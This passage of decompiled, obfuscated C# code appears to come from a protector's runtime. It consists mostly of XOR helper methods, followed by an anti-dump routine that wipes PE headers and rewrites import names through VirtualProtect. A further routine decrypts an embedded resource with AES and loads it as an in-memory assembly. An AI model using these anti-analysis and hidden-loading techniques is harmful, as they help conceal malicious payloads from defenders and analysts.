		return int_4 ^ 0x68654034;
	}

	[Obsolete("Exclude")]
	public static int smethod_10063(int int_4)
	{
		return int_4 ^ 0x6F08A390;
	}

	[Obsolete("Exclude")]
	public static int smethod_10065(int int_4)
	{
		return int_4 ^ 0x7D441A98;
	}

	[Obsolete("Exclude")]
	public static int smethod_10072(int int_4)
	{
		return int_4 ^ 0x3BB4C1F1;
	}

	[Obsolete("Exclude")]
	public static int smethod_10083(int int_4)
	{
		return int_4 ^ 0x75E71791;
	}

	[Obsolete("Exclude")]
	public static int smethod_10084(int int_4)
	{
		return int_4 ^ 0x44E3A6D6;
	}

	[Obsolete("Exclude")]
	public static int smethod_10085(int int_4)
	{
		return int_4 ^ 0x453F465E;
	}

	[Obsolete("Exclude")]
	public static int smethod_10089(int int_4)
	{
		return int_4 ^ 0x5D2E45D3;
	}

	[Obsolete("Exclude")]
	public static int smethod_10096(int int_4)
	{
		return int_4 ^ 0x7FF2267C;
	}

	[Obsolete("Exclude")]
	public static int smethod_10109(int int_4)
	{
		return int_4 ^ 0x19FCAFCF;
	}

	[Obsolete("Exclude")]
	public static int smethod_10110(int int_4)
	{
		return int_4 ^ 0x2B1652E1;
	}

	[Obsolete("Exclude")]
	public static int smethod_10111(int int_4)
	{
		return int_4 ^ 0x68924F72;
	}

	[Obsolete("Exclude")]
	public static int smethod_10114(int int_4)
	{
		return int_4 ^ 0x68202CB1;
	}

	[Obsolete("Exclude")]
	public static int smethod_10124(int int_4)
	{
		return int_4 ^ 0x51F8FAE2;
	}

	[Obsolete("Exclude")]
	public static int smethod_10126(int int_4)
	{
		return int_4 ^ 0x1D035CF0;
	}

	[Obsolete("Exclude")]
	public static int smethod_10131(int int_4)
	{
		return int_4 ^ 0x48F66F63;
	}

	[Obsolete("Exclude")]
	public static int smethod_10135(int int_4)
	{
		return int_4 ^ 0x410EE1F4;
	}

	[Obsolete("Exclude")]
	public static int smethod_10148(int int_4)
	{
		return int_4 ^ 0x164EB16E;
	}

	[Obsolete("Exclude")]
	public static int smethod_10150(int int_4)
	{
		return int_4 ^ 0x19520E1;
	}

	[Obsolete("Exclude")]
	public static int smethod_10164(int int_4)
	{
		return int_4 ^ 0x77C2E1E;
	}

	[Obsolete("Exclude")]
	public static int smethod_10173(int int_4)
	{
		return int_4 ^ 0x71A8B862;
	}

	[Obsolete("Exclude")]
	public static int smethod_10176(int int_4)
	{
		return int_4 ^ 0x114C076D;
	}

	[Obsolete("Exclude")]
	public static int smethod_10178(int int_4)
	{
		return int_4 ^ 0x39D009A3;
	}

	[Obsolete("Exclude")]
	public static int smethod_10182(int int_4)
	{
		return int_4 ^ 0x17257B5;
	}

	[Obsolete("Exclude")]
	public static int smethod_10186(int int_4)
	{
		return int_4 ^ 0x20D7D281;
	}

	[Obsolete("Exclude")]
	public static int smethod_10199(int int_4)
	{
		return int_4 ^ 0x5C14E6EE;
	}

	[Obsolete("Exclude")]
	public static int smethod_10203(int int_4)
	{
		return int_4 ^ 0x2BE4CB94;
	}

	[Obsolete("Exclude")]
	public static int smethod_10205(int int_4)
	{
		return int_4 ^ 0x56416489;
	}

	[Obsolete("Exclude")]
	public static int smethod_10207(int int_4)
	{
		return int_4 ^ 0x1DD0E1A0;
	}

	[Obsolete("Exclude")]
	public static int smethod_10209(int int_4)
	{
		return int_4 ^ 0x56FD3964;
	}

	[Obsolete("Exclude")]
	public static int smethod_10217(int int_4)
	{
		return int_4 ^ 0x1AE4788B;
	}

	[Obsolete("Exclude")]
	public static int smethod_10218(int int_4)
	{
		return int_4 ^ 0x61E640D9;
	}

	[Obsolete("Exclude")]
	public static int smethod_10219(int int_4)
	{
		return int_4 ^ 0x329109FB;
	}

	[Obsolete("Exclude")]
	public static int smethod_10221(int int_4)
	{
		return int_4 ^ 0x3FCD546A;
	}

	[Obsolete("Exclude")]
	public static int smethod_10226(int int_4)
	{
		return int_4 ^ 0x31EA1BBE;
	}

	[Obsolete("Exclude")]
	public static int smethod_10228(int int_4)
	{
		return int_4 ^ 0x7032FD43;
	}

	[Obsolete("Exclude")]
	public static int smethod_10230(int int_4)
	{
		return int_4 ^ 0x2158E9DA;
	}

	[Obsolete("Exclude")]
	public static int smethod_10232(int int_4)
	{
		return int_4 ^ 0x524D451A;
	}

	[Obsolete("Exclude")]
	public static int smethod_10237(int int_4)
	{
		return int_4 ^ 0x4024F050;
	}

	[Obsolete("Exclude")]
	public static int smethod_10241(int int_4)
	{
		return int_4 ^ 0x7F5DF077;
	}

	[Obsolete("Exclude")]
	public static int smethod_10244(int int_4)
	{
		return int_4 ^ 0x397FD316;
	}

	[Obsolete("Exclude")]
	public static int smethod_10248(int int_4)
	{
		return int_4 ^ 0x330524;
	}

	[Obsolete("Exclude")]
	public static int smethod_10252(int int_4)
	{
		return int_4 ^ 0xC26A98C;
	}

	[Obsolete("Exclude")]
	public static int smethod_10254(int int_4)
	{
		return int_4 ^ 0x6226CFB;
	}

	[Obsolete("Exclude")]
	public static int smethod_10257(int int_4)
	{
		return int_4 ^ 0x199F7B8B;
	}

	[Obsolete("Exclude")]
	public static int smethod_10260(int int_4)
	{
		return int_4 ^ 0x3990205B;
	}

	[Obsolete("Exclude")]
	public static int smethod_10272(int int_4)
	{
		return int_4 ^ 0x2BD7C5D6;
	}

	[Obsolete("Exclude")]
	public static int smethod_10276(int int_4)
	{
		return int_4 ^ 0x7953F415;
	}

	[Obsolete("Exclude")]
	public static int smethod_10277(int int_4)
	{
		return int_4 ^ 0x3BE828A4;
	}

	[Obsolete("Exclude")]
	public static int smethod_10279(int int_4)
	{
		return int_4 ^ 0x69DD8960;
	}

	[Obsolete("Exclude")]
	public static int smethod_10287(int int_4)
	{
		return int_4 ^ 0x33B31DA2;
	}

	[Obsolete("Exclude")]
	public static int smethod_10288(int int_4)
	{
		return int_4 ^ 0x201674BD;
	}

	[Obsolete("Exclude")]
	public static int smethod_10307(int int_4)
	{
		return int_4 ^ 0x2435B449;
	}

	[Obsolete("Exclude")]
	public static int smethod_10310(int int_4)
	{
		return int_4 ^ 0xB6D42A2;
	}

	[Obsolete("Exclude")]
	public static int smethod_10320(int int_4)
	{
		return int_4 ^ 0x16EA8396;
	}

	[Obsolete("Exclude")]
	public static int smethod_10328(int int_4)
	{
		return int_4 ^ 0x3100B6A0;
	}

	[Obsolete("Exclude")]
	public static int smethod_10334(int int_4)
	{
		return int_4 ^ 0x315F2351;
	}

	[Obsolete("Exclude")]
	public static int smethod_10336(int int_4)
	{
		return int_4 ^ 0xD6D38AE;
	}

	[Obsolete("Exclude")]
	public static int smethod_10339(int int_4)
	{
		return int_4 ^ 0x4BD43F;
	}

	[Obsolete("Exclude")]
	public static int smethod_10341(int int_4)
	{
		return int_4 ^ 0x5EA9835C;
	}

	[Obsolete("Exclude")]
	public static int smethod_10359(int int_4)
	{
		return int_4 ^ 0x1441E68F;
	}

	[Obsolete("Exclude")]
	public static int smethod_10368(int int_4)
	{
		return int_4 ^ 0x44BA1441;
	}

	[Obsolete("Exclude")]
	public static int smethod_10370(int int_4)
	{
		return int_4 ^ 0x401129C6;
	}

	[Obsolete("Exclude")]
	public static int smethod_10371(int int_4)
	{
		return int_4 ^ 0x58447674;
	}

	[Obsolete("Exclude")]
	public static int smethod_10376(int int_4)
	{
		return int_4 ^ 0x1EC03883;
	}

	[Obsolete("Exclude")]
	public static int smethod_10383(int int_4)
	{
		return int_4 ^ 0xE22CDF8;
	}

	[Obsolete("Exclude")]
	public static int smethod_10385(int int_4)
	{
		return int_4 ^ 0x677EBF90;
	}

	[Obsolete("Exclude")]
	public static int smethod_10389(int int_4)
	{
		return int_4 ^ 0x623F7D5F;
	}

	[Obsolete("Exclude")]
	public static int smethod_10393(int int_4)
	{
		return int_4 ^ 0x794353E;
	}

	[Obsolete("Exclude")]
	public static int smethod_10403(int int_4)
	{
		return int_4 ^ 0x1F3A434;
	}

	[Obsolete("Exclude")]
	public static int smethod_10416(int int_4)
	{
		return int_4 ^ 0x41A9635F;
	}

	[Obsolete("Exclude")]
	public static int smethod_10425(int int_4)
	{
		return int_4 ^ 0x3D034BF;
	}

	[Obsolete("Exclude")]
	public static int smethod_10427(int int_4)
	{
		return int_4 ^ 0x7C1804BD;
	}

	[Obsolete("Exclude")]
	public static int smethod_10429(int int_4)
	{
		return int_4 ^ 0x30D19475;
	}

	[Obsolete("Exclude")]
	public static int smethod_10430(int int_4)
	{
		return int_4 ^ 0x33034D3E;
	}

	[Obsolete("Exclude")]
	public static int smethod_10432(int int_4)
	{
		return int_4 ^ 0xC8E989C;
	}

	[Obsolete("Exclude")]
	public static int smethod_10442(int int_4)
	{
		return int_4 ^ 0xBB81FA0;
	}

	[Obsolete("Exclude")]
	public static int smethod_10451(int int_4)
	{
		return int_4 ^ 0x363D693C;
	}

	[Obsolete("Exclude")]
	public static int smethod_10460(int int_4)
	{
		return int_4 ^ 0x1C525EB3;
	}

	[Obsolete("Exclude")]
	public static int smethod_10466(int int_4)
	{
		return int_4 ^ 0x7E54A8F8;
	}

	[Obsolete("Exclude")]
	public static int smethod_10468(int int_4)
	{
		return int_4 ^ 0x1DD06CC3;
	}

	[Obsolete("Exclude")]
	public static int smethod_10469(int int_4)
	{
		return int_4 ^ 0xFE703C1;
	}

	[Obsolete("Exclude")]
	public static int smethod_10489(int int_4)
	{
		return int_4 ^ 0x362A9A2E;
	}

	[Obsolete("Exclude")]
	public static int smethod_10493(int int_4)
	{
		return int_4 ^ 0x5755E26A;
	}

	[Obsolete("Exclude")]
	public static int smethod_10494(int int_4)
	{
		return int_4 ^ 0x1946110A;
	}

	[Obsolete("Exclude")]
	public static int smethod_10497(int int_4)
	{
		return int_4 ^ 0x17A40919;
	}

	[Obsolete("Exclude")]
	public static int smethod_10509(int int_4)
	{
		return int_4 ^ 0xBCD58A1;
	}

	[Obsolete("Exclude")]
	public static int smethod_10517(int int_4)
	{
		return int_4 ^ 0x21D32FBF;
	}

	[Obsolete("Exclude")]
	public static int smethod_10518(int int_4)
	{
		return int_4 ^ 0x7A3044C0;
	}

	[Obsolete("Exclude")]
	public static int smethod_10520(int int_4)
	{
		return int_4 ^ 0xA32F219;
	}

	[Obsolete("Exclude")]
	public static int smethod_10526(int int_4)
	{
		return int_4 ^ 0x8C3F239;
	}

	[Obsolete("Exclude")]
	public static int smethod_10527(int int_4)
	{
		return int_4 ^ 0x6C7D5CE4;
	}

	[Obsolete("Exclude")]
	public static int smethod_10540(int int_4)
	{
		return int_4 ^ 0x42C25609;
	}

	[Obsolete("Exclude")]
	public static int smethod_10553(int int_4)
	{
		return int_4 ^ 0x191D1DA5;
	}

	[Obsolete("Exclude")]
	public static int smethod_10563(int int_4)
	{
		return int_4 ^ 0x291694C3;
	}

	[Obsolete("Exclude")]
	public static int smethod_10573(int int_4)
	{
		return int_4 ^ 0x511ABF26;
	}

	[Obsolete("Exclude")]
	public static int smethod_10582(int int_4)
	{
		return int_4 ^ 0x50445AB3;
	}

	[Obsolete("Exclude")]
	public static int smethod_10588(int int_4)
	{
		return int_4 ^ 0x4E909753;
	}

	[Obsolete("Exclude")]
	public static int smethod_10590(int int_4)
	{
		return int_4 ^ 0x591E485F;
	}

	[Obsolete("Exclude")]
	public static int smethod_10597(int int_4)
	{
		return int_4 ^ 0x718A132C;
	}

	[Obsolete("Exclude")]
	public static int smethod_10621(int int_4)
	{
		return int_4 ^ 0x4EB784C8;
	}

	[Obsolete("Exclude")]
	public static int smethod_10627(int int_4)
	{
		return int_4 ^ 0x41299BE2;
	}

	[Obsolete("Exclude")]
	public static int smethod_10644(int int_4)
	{
		return int_4 ^ 0x472EE10D;
	}

	[Obsolete("Exclude")]
	public static int smethod_10650(int int_4)
	{
		return int_4 ^ 0x41347855;
	}

	[Obsolete("Exclude")]
	public static int smethod_10653(int int_4)
	{
		return int_4 ^ 0x7289BFD3;
	}

	[Obsolete("Exclude")]
	public static int smethod_10654(int int_4)
	{
		return int_4 ^ 0x49DA7806;
	}

	[Obsolete("Exclude")]
	public static int smethod_10655(int int_4)
	{
		return int_4 ^ 0x3AC6ED25;
	}

	[Obsolete("Exclude")]
	public static int smethod_10656(int int_4)
	{
		return int_4 ^ 0x751FF489;
	}

	[Obsolete("Exclude")]
	public static int smethod_10657(int int_4)
	{
		return int_4 ^ 0x7C925847;
	}

	[Obsolete("Exclude")]
	public static int smethod_10665(int int_4)
	{
		return int_4 ^ 0x1A79EA7C;
	}

	[Obsolete("Exclude")]
	public static int smethod_10670(int int_4)
	{
		return int_4 ^ 0x100EFC3A;
	}

	[Obsolete("Exclude")]
	public static int smethod_10692(int int_4)
	{
		return int_4 ^ 0x54D97AAF;
	}

	[Obsolete("Exclude")]
	public static int smethod_10696(int int_4)
	{
		return int_4 ^ 0x572B4D01;
	}

	[Obsolete("Exclude")]
	public static int smethod_10705(int int_4)
	{
		return int_4 ^ 0x4B6431DF;
	}

	[Obsolete("Exclude")]
	public static int smethod_10710(int int_4)
	{
		return int_4 ^ 0x676CE482;
	}

	[Obsolete("Exclude")]
	public static int smethod_10739(int int_4)
	{
		return int_4 ^ 0x78A277CA;
	}

	[Obsolete("Exclude")]
	public static int smethod_10746(int int_4)
	{
		return int_4 ^ 0x6FF36F0;
	}

	[Obsolete("Exclude")]
	public static int smethod_10749(int int_4)
	{
		return int_4 ^ 0x1D3DDE55;
	}

	[Obsolete("Exclude")]
	public static int smethod_10758(int int_4)
	{
		return int_4 ^ 0x322549D5;
	}

	[Obsolete("Exclude")]
	public static int smethod_10785(int int_4)
	{
		return int_4 ^ 0x84B999;
	}

	[Obsolete("Exclude")]
	public static int smethod_10788(int int_4)
	{
		return int_4 ^ 0x59B71190;
	}

	[Obsolete("Exclude")]
	public static int smethod_10798(int int_4)
	{
		return int_4 ^ 0x40AF5671;
	}

	[Obsolete("Exclude")]
	public static int smethod_10813(int int_4)
	{
		return int_4 ^ 0x687F0EB8;
	}

	[Obsolete("Exclude")]
	public static int smethod_10814(int int_4)
	{
		return int_4 ^ 0x37010A84;
	}

	[Obsolete("Exclude")]
	public static int smethod_10820(int int_4)
	{
		return int_4 ^ 0x6DB23224;
	}

	[Obsolete("Exclude")]
	public static int smethod_10821(int int_4)
	{
		return int_4 ^ 0x4CFF3918;
	}

	[Obsolete("Exclude")]
	public static int smethod_10824(int int_4)
	{
		return int_4 ^ 0x2E89CAC;
	}

	[Obsolete("Exclude")]
	public static int smethod_10835(int int_4)
	{
		return int_4 ^ 0x7403729B;
	}

	[Obsolete("Exclude")]
	public static int smethod_10836(int int_4)
	{
		return int_4 ^ 0x576EE2C3;
	}

	[Obsolete("Exclude")]
	public static int smethod_10844(int int_4)
	{
		return int_4 ^ 0x25A85154;
	}

	[Obsolete("Exclude")]
	public static int smethod_10859(int int_4)
	{
		return int_4 ^ 0x10DC1164;
	}

	[Obsolete("Exclude")]
	public static int smethod_10861(int int_4)
	{
		return int_4 ^ 0x75783009;
	}

	[Obsolete("Exclude")]
	public static int smethod_10862(int int_4)
	{
		return int_4 ^ 0xC1C8DDA;
	}

	[Obsolete("Exclude")]
	public static int smethod_10875(int int_4)
	{
		return int_4 ^ 0x727D651C;
	}

	[Obsolete("Exclude")]
	public static int smethod_10881(int int_4)
	{
		return int_4 ^ 0x61DF47A2;
	}

	[Obsolete("Exclude")]
	public static int smethod_10882(int int_4)
	{
		return int_4 ^ 0x7957D278;
	}

	[Obsolete("Exclude")]
	public static int smethod_10892(int int_4)
	{
		return int_4 ^ 0x5C1AF364;
	}

	[Obsolete("Exclude")]
	public static int smethod_10893(int int_4)
	{
		return int_4 ^ 0x4BBB5F2;
	}

	[Obsolete("Exclude")]
	public static int smethod_10912(int int_4)
	{
		return int_4 ^ 0x684EEBC9;
	}

	[Obsolete("Exclude")]
	public static int smethod_10921(int int_4)
	{
		return int_4 ^ 0x4C72918B;
	}

	[Obsolete("Exclude")]
	public static int smethod_10925(int int_4)
	{
		return int_4 ^ 0x6ABDF485;
	}

	[Obsolete("Exclude")]
	public static int smethod_10930(int int_4)
	{
		return int_4 ^ 0x31F51AD7;
	}

	[Obsolete("Exclude")]
	public static int smethod_10936(int int_4)
	{
		return int_4 ^ 0x211173AD;
	}

	[Obsolete("Exclude")]
	public static int smethod_10939(int int_4)
	{
		return int_4 ^ 0x10389029;
	}

	[Obsolete("Exclude")]
	public static int smethod_10957(int int_4)
	{
		return int_4 ^ 0x1ABCD052;
	}

	[Obsolete("Exclude")]
	public static int smethod_10959(int int_4)
	{
		return int_4 ^ 0x66ECD9D5;
	}

	[Obsolete("Exclude")]
	public static int smethod_10961(int int_4)
	{
		return int_4 ^ 0xD19A781;
	}

	[Obsolete("Exclude")]
	public static int smethod_10984(int int_4)
	{
		return int_4 ^ 0x47469792;
	}

	[Obsolete("Exclude")]
	public static int smethod_11004(int int_4)
	{
		return int_4 ^ 0x11A225EB;
	}

	[Obsolete("Exclude")]
	public static int smethod_11028(int int_4)
	{
		return int_4 ^ 0x584E12C9;
	}

	[Obsolete("Exclude")]
	public static int smethod_11035(int int_4)
	{
		return int_4 ^ 0x43E93E21;
	}

	[Obsolete("Exclude")]
	public static int smethod_11042(int int_4)
	{
		return int_4 ^ 0x3759E279;
	}

	[Obsolete("Exclude")]
	public static int smethod_11046(int int_4)
	{
		return int_4 ^ 0x3EF79E6;
	}

	[Obsolete("Exclude")]
	public static int smethod_11048(int int_4)
	{
		return int_4 ^ 0x40780651;
	}

	[Obsolete("Exclude")]
	public static int smethod_11055(int int_4)
	{
		return int_4 ^ 0x6BCDA1F6;
	}

	[Obsolete("Exclude")]
	public static int smethod_11072(int int_4)
	{
		return int_4 ^ 0x52E8355;
	}

	[Obsolete("Exclude")]
	public static int smethod_11079(int int_4)
	{
		return int_4 ^ 0x7981DCB5;
	}

	[Obsolete("Exclude")]
	public static int smethod_11091(int int_4)
	{
		return int_4 ^ 0x5EEB6D53;
	}

	[Obsolete("Exclude")]
	public static int smethod_11093(int int_4)
	{
		return int_4 ^ 0x79895AF6;
	}

	[Obsolete("Exclude")]
	public static int smethod_11099(int int_4)
	{
		return int_4 ^ 0x7E8A28D9;
	}

	[Obsolete("Exclude")]
	public static int smethod_11117(int int_4)
	{
		return int_4 ^ 0x47A4E082;
	}

	[Obsolete("Exclude")]
	public static int smethod_11119(int int_4)
	{
		return int_4 ^ 0x235789EC;
	}

	[Obsolete("Exclude")]
	public static int smethod_11130(int int_4)
	{
		return int_4 ^ 0x42744C79;
	}

	[Obsolete("Exclude")]
	public static int smethod_11139(int int_4)
	{
		return int_4 ^ 0x732A551D;
	}

	[Obsolete("Exclude")]
	public static int smethod_11156(int int_4)
	{
		return int_4 ^ 0xE451A7E;
	}

	[Obsolete("Exclude")]
	public static int smethod_11171(int int_4)
	{
		return int_4 ^ 0x53DBCF2D;
	}

	[Obsolete("Exclude")]
	public static int smethod_11179(int int_4)
	{
		return int_4 ^ 0x5806D66A;
	}

	[Obsolete("Exclude")]
	public static int smethod_11196(int int_4)
	{
		return int_4 ^ 0x27781D55;
	}

	[Obsolete("Exclude")]
	public static int smethod_11213(int int_4)
	{
		return int_4 ^ 0x9B43A3C;
	}

	[Obsolete("Exclude")]
	public static int smethod_11235(int int_4)
	{
		return int_4 ^ 0x453A29EA;
	}

	[Obsolete("Exclude")]
	public static int smethod_11269(int int_4)
	{
		return int_4 ^ 0x4A785FD2;
	}

	[Obsolete("Exclude")]
	public static int smethod_11279(int int_4)
	{
		return int_4 ^ 0x339D6368;
	}

	[DllImport("kernel32.dll")]
	[Obsolete("Exclude")]
	private unsafe static extern bool VirtualProtect(byte* pByte_0, int int_4, uint uint_1, ref uint uint_2);

	[Obsolete("Exclude")]
	private unsafe static void smethod_11285()
	{
		Module module = typeof(EazfuscatorResourceDecoder).Module;
		byte* ptr = (byte*)(void*)Marshal.GetHINSTANCE(module);
		byte* ptr2 = ptr + 60;
		ptr2 = ptr + (uint)(*(int*)ptr2);
		ptr2 += 6;
		ushort num = *(ushort*)ptr2;
		ptr2 += 14;
		ushort num2 = *(ushort*)ptr2;
		ptr2 = ptr2 + 4 + (int)num2;
		byte* ptr3 = stackalloc byte[11];
		uint uint_ = default(uint);
		if (module.FullyQualifiedName[0] == '<')
		{
			uint num3 = *((uint*)ptr2 - 4);
			uint num4 = *((uint*)ptr2 - 30);
			uint[] array = new uint[num];
			uint[] array2 = new uint[num];
			uint[] array3 = new uint[num];
			for (int i = 0; i < num; i++)
			{
				VirtualProtect(ptr2, 8, 64u, ref uint_);
				Marshal.Copy(new byte[8], 0, (nint)(void*)ptr2, 8);
				array[i] = ((uint*)ptr2)[3];
				array2[i] = ((uint*)ptr2)[2];
				array3[i] = ((uint*)ptr2)[5];
				ptr2 += 40;
			}
			if (num4 != 0)
			{
				for (int j = 0; j < num; j++)
				{
					if (array[j] <= num4 && num4 < array[j] + array2[j])
					{
						num4 = num4 - array[j] + array3[j];
						break;
					}
				}
				byte* ptr4 = ptr + num4;
				uint num5 = *(uint*)ptr4;
				for (int k = 0; k < num; k++)
				{
					if (array[k] <= num5 && num5 < array[k] + array2[k])
					{
						num5 = num5 - array[k] + array3[k];
						break;
					}
				}
				byte* ptr5 = ptr + num5;
				uint num6 = ((uint*)ptr4)[3];
				for (int l = 0; l < num; l++)
				{
					if (array[l] <= num6 && num6 < array[l] + array2[l])
					{
						num6 = num6 - array[l] + array3[l];
						break;
					}
				}
				uint num7 = *(uint*)ptr5 + 2;
				for (int m = 0; m < num; m++)
				{
					if (array[m] <= num7 && num7 < array[m] + array2[m])
					{
						num7 = num7 - array[m] + array3[m];
						break;
					}
				}
				VirtualProtect(ptr + num6, 11, 64u, ref uint_);
				*(int*)ptr3 = 1818522734;
				((int*)ptr3)[1] = 1818504812;
				((short*)ptr3)[4] = 108;
				ptr3[10] = 0;
				for (int n = 0; n < 11; n++)
				{
					(ptr + num6)[n] = ptr3[n];
				}
				VirtualProtect(ptr + num7, 11, 64u, ref uint_);
				*(int*)ptr3 = 1866691662;
				((int*)ptr3)[1] = 1852404846;
				((short*)ptr3)[4] = 25973;
				ptr3[10] = 0;
				for (int num8 = 0; num8 < 11; num8++)
				{
					(ptr + num7)[num8] = ptr3[num8];
				}
			}
			for (int num9 = 0; num9 < num; num9++)
			{
				if (array[num9] <= num3 && num3 < array[num9] + array2[num9])
				{
					num3 = num3 - array[num9] + array3[num9];
					break;
				}
			}
			byte* ptr6 = ptr + num3;
			VirtualProtect(ptr6, 72, 64u, ref uint_);
			uint num10 = ((uint*)ptr6)[2];
			for (int num11 = 0; num11 < num; num11++)
			{
				if (array[num11] <= num10 && num10 < array[num11] + array2[num11])
				{
					num10 = num10 - array[num11] + array3[num11];
					break;
				}
			}
			*(int*)ptr6 = 0;
			((int*)ptr6)[1] = 0;
			((int*)ptr6)[2] = 0;
			((int*)ptr6)[3] = 0;
			byte* ptr7 = ptr + num10;
			VirtualProtect(ptr7, 4, 64u, ref uint_);
			*(int*)ptr7 = 0;
			ptr7 += 12;
			ptr7 += (uint)(*(int*)ptr7);
			ptr7 = (byte*)(((long)ptr7 + 7L) & -4L);
			ptr7 += 2;
			ushort num12 = *ptr7;
			ptr7 += 2;
			for (int num13 = 0; num13 < num12; num13++)
			{
				VirtualProtect(ptr7, 8, 64u, ref uint_);
				ptr7 += 4;
				ptr7 += 4;
				for (int num14 = 0; num14 < 8; num14++)
				{
					VirtualProtect(ptr7, 4, 64u, ref uint_);
					*ptr7 = 0;
					ptr7++;
					if (*ptr7 != 0)
					{
						*ptr7 = 0;
						ptr7++;
						if (*ptr7 != 0)
						{
							*ptr7 = 0;
							ptr7++;
							if (*ptr7 != 0)
							{
								*ptr7 = 0;
								ptr7++;
								continue;
							}
							ptr7++;
							break;
						}
						ptr7 += 2;
						break;
					}
					ptr7 += 3;
					break;
				}
			}
			return;
		}
		byte* ptr8 = ptr + (uint)(*((int*)ptr2 - 4));
		if (*((uint*)ptr2 - 30) != 0)
		{
			byte* ptr9 = ptr + (uint)(*((int*)ptr2 - 30));
			byte* ptr10 = ptr + (uint)(*(int*)ptr9);
			byte* ptr11 = ptr + (uint)((int*)ptr9)[3];
			byte* ptr12 = ptr + (uint)(*(int*)ptr10) + 2;
			VirtualProtect(ptr11, 11, 64u, ref uint_);
			*(int*)ptr3 = 1818522734;
			((int*)ptr3)[1] = 1818504812;
			((short*)ptr3)[4] = 108;
			ptr3[10] = 0;
			for (int num15 = 0; num15 < 11; num15++)
			{
				ptr11[num15] = ptr3[num15];
			}
			VirtualProtect(ptr12, 11, 64u, ref uint_);
			*(int*)ptr3 = 1866691662;
			((int*)ptr3)[1] = 1852404846;
			((short*)ptr3)[4] = 25973;
			ptr3[10] = 0;
			for (int num16 = 0; num16 < 11; num16++)
			{
				ptr12[num16] = ptr3[num16];
			}
		}
		for (int num17 = 0; num17 < num; num17++)
		{
			VirtualProtect(ptr2, 8, 64u, ref uint_);
			Marshal.Copy(new byte[8], 0, (nint)(void*)ptr2, 8);
			ptr2 += 40;
		}
		VirtualProtect(ptr8, 72, 64u, ref uint_);
		byte* ptr13 = ptr + (uint)((int*)ptr8)[2];
		*(int*)ptr8 = 0;
		((int*)ptr8)[1] = 0;
		((int*)ptr8)[2] = 0;
		((int*)ptr8)[3] = 0;
		VirtualProtect(ptr13, 4, 64u, ref uint_);
		*(int*)ptr13 = 0;
		ptr13 += 12;
		ptr13 += (uint)(*(int*)ptr13);
		ptr13 = (byte*)(((long)ptr13 + 7L) & -4L);
		ptr13 += 2;
		ushort num18 = *ptr13;
		ptr13 += 2;
		for (int num19 = 0; num19 < num18; num19++)
		{
			VirtualProtect(ptr13, 8, 64u, ref uint_);
			ptr13 += 4;
			ptr13 += 4;
			for (int num20 = 0; num20 < 8; num20++)
			{
				VirtualProtect(ptr13, 4, 64u, ref uint_);
				*ptr13 = 0;
				ptr13++;
				if (*ptr13 != 0)
				{
					*ptr13 = 0;
					ptr13++;
					if (*ptr13 != 0)
					{
						*ptr13 = 0;
						ptr13++;
						if (*ptr13 != 0)
						{
							*ptr13 = 0;
							ptr13++;
							continue;
						}
						ptr13++;
						break;
					}
					ptr13 += 2;
					break;
				}
				ptr13 += 3;
				break;
			}
		}
	}

	public static byte[] smethod_11286(byte[] byte_0)
	{
		using MemoryStream stream = new MemoryStream(byte_0);
		using GZipStream gZipStream = new GZipStream(stream, CompressionMode.Decompress);
		using MemoryStream memoryStream = new MemoryStream();
		gZipStream.CopyTo(memoryStream);
		return memoryStream.ToArray();
	}

	internal static void smethod_11287()
	{
		try
		{
			Stream manifestResourceStream = typeof(EazfuscatorResourceDecoder).Assembly.GetManifestResourceStream("Хитролох_иди_нахуй._________72_8_6__5_");
			if (manifestResourceStream != null)
			{
				byte[] array = new byte[manifestResourceStream.Length];
				manifestResourceStream.Read(array, 0, array.Length);
				manifestResourceStream.Close();
				Rijndael rijndael = Rijndael.Create();
				rijndael.Key = SHA256.Create().ComputeHash(BitConverter.GetBytes(10));
				rijndael.IV = new byte[16];
				rijndael.Mode = CipherMode.CBC;
				MemoryStream memoryStream = new MemoryStream();
				CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndael.CreateDecryptor(), CryptoStreamMode.Write);
				cryptoStream.Write(array, 0, array.Length);
				cryptoStream.FlushFinalBlock();
				array = memoryStream.ToArray();
				memoryStream.Close();
				cryptoStream.Close();
				assembly_0 = Assembly.Load(smethod_11286(array));
				AppDomain.CurrentDomain.AssemblyResolve += smethod_11288;
			}
		}
		catch (Exception)
		{
		}
	}

	public static Assembly smethod_11288(object object_0, ResolveEventArgs resolveEventArgs_0)
	{
		if (!(assembly_0 != null) || !(assembly_0.FullName == resolveEventArgs_0.Name))
		{
			return null;
		}
		return assembly_0;
	}

	internal static void smethod_11289()
	{
		Debug.Close();
		Debug.Write(true, "");
	}

	internal static void smethod_11290()
	{
		Debug.Close();
		Debug.Write(true, "");
	}

	internal static void smethod_11291()
	{
		Debug.Close();
		Debug.Write(true, "");
	}

	internal static void smethod_11292()
	{
		Debug.Close();
		Debug.Write(true, "");
	}

	internal static void smethod_11293()
	{
		Debug.Close();
		Debug.Write(true, "");
	}

	internal static void smethod_11294()
	{
		Debug.Close();
		Debug.Write(true, "");
	}

	internal static void smethod_11295()
	{
		Debug.Close();
		Debug.Write(true, "");
	}

	internal static void smethod_11296()
	{
		Debug.Close();
		Debug.Write(true, "");
	}

	internal static void smethod_11297()
	{
		Debug.Close();
		Debug.Write(true, "");
	}

	internal static void smethod_11298()
	{
		Debug.Close();
		Debug.Write(true, "");
	}

	internal static void smethod_11299()
	{
		Debug.Close();
		Debug.Write(true, "");
	}

	internal static void smethod_11300()
	{
		Debug.Close();
		Debug.Write(true, "");
	}

	internal static void smethod_11301()
	{
		Debug.Close();
		Debug.Write(true, "");
	}

	internal static void smethod_11302()
	{
		Debug.Close();
		Debug.Write(true, "");
	}

	internal static void smethod_11303()
	{
		Debug.Close();
		Debug.Write(true, "");
	}

	internal static void smethod_11304()
	{
		Debug.Close();
		Debug.Write(true, "");
	}

	internal static void smethod_11305()
	{
		Debug.Close();
		Debug.Write(true, "");
	}

	internal static void smethod_11306()
	{
		Debug.Close();
		Debug.Write(true, "");
	}

	internal static void smethod_11307()
	{
		Debug.Close();
		Debug.Write(true, "");
	}

	internal static void smethod_11308()
	{
		Debug.Close();
		Debug.Write(true, "");
	}

	internal static void smethod_11309()
	{
		Debug.Close();
		Debug.Write(true, "");
	}

	internal static void smethod_11310()
	{
		Debug.Close();
		Debug.Write(true, "");
	}

	internal static void smethod_11311()
	{
		Debug.Close();
		Debug.Write(true, "");
	}

	internal static void smethod_11312()
	{
		Debug.Close();
		Debug.Write(true, "");
	}

	internal static void smethod_11313()
	{
		Debug.Close();
		Debug.Write(true, "");
	}

	internal static void smethod_11314()
	{
		Debug.Close();
